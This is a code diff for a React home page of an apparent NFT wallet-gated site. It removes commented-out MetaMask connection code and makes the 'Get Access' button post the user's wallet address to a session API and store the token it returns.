@@ -2,46 +2,20 @@
 // import { injected } from "../../components/wallet/connector"
 import React, { useEffect, useState } from "react";
 //  import { ConnectButton, Hero, HeroTextDiv, Span, TwoPartDiv, Wrapper, Circle, SocialsWrapper} from "./style"
+import axios from "axios";
 import './style.css';
-import {ToastContainer, toast} from 'react-toastify'
+import {toast} from 'react-toastify'
 import 'react-toastify/dist/ReactToastify.css'
 import FB from '../../assets/facebook.png'
 import TW from '../../assets/twitter.png'
 import DS from '../../assets/discord.png'
 import lily from "../../assets/lilypad.png";
-import ChillFr from '../../assets/frog.gif.gif';
-import {verify} from '../utils/index.js';
 
 toast.configure()
 const mainnetChainId = "0x1";
 const Home = () => {
-//   const { active,  activate, deactivate } = useWeb3React()
-// //account, library, connector,
-
-  
-//   async function disconnect() {
-//     try {
-//       deactivate()
-//     } catch (ex) {
-//       console.log(ex)
-//     }
-//   }
-
-//   async function connect() {
-//     if (!window.ethereum) {
-//       return toast.error("Please install MetaMask to use this website")
-//     }
-
-//     if (active) { return disconnect() }
-
-//     try {
-//       await activate(injected)
-//     } catch (ex) {
-//       console.log(ex, 'error')
-//     }
-//   }
-
 const [currentAccount, setCurrentAccount] = useState("");
+const [tokenKey, setToken] = useState("")
     
     const checkIfWalletIsConnected = async () => {
       const { ethereum } = window;
@@ -107,6 +81,23 @@ if (chainId !== mainnetChainId) {
   }
 
 
+  async function startSession (userAddress, setToken) {
+    try {
+      let {data:{session:{token}}} = await axios({
+  method: 'post',
+  url: "https://chill-frogs-api.monitorcoreservice.com/oauth/wallet/start-session",
+  data: {
+    walletAddress: userAddress
+  }
+});
+setToken(token)
+    } catch (error) {
+      toast.error(error.message,"try again")
+    }
+    
+}
+
+
 
   useEffect(() => {
     //checkIfWalletIsConnected();
@@ -151,15 +142,13 @@ return () =>{}
           <div className="buttonCont">
             {currentAccount === "" ? (
               <button onClick={connectWallet} className="button">
-                {" "}
-                Connect Wallet{" "}
+                Connect Wallet
               </button>
             ) : (
-               <button onClick={()=>verify(currentAccount)} className="button">
-                {" "}
-                Get Access{" "}
+               <button onClick={() => startSession(currentAccount,setToken)} className="button">
+                Get Access
               </button>
-            )}{" "}
+            )}
           </div>
         </div>
         <footer>
